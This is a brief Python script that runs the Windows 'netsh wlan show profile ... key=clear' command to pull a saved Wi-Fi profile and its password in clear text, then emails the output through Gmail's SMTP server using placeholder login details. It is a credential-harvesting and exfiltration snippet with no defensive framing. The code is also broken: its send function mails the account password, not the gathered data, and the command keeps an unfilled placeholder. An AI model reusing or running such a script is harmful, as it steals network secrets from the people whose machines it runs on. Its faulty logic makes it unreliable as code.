import subprocess, smtplib

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, password)
    server.quit()

command = "netsh wlan show profile (your profile - WIFI) key=clear"
result = subprocess.check_output(command, shell=True)
send_email("your email", "your password", result )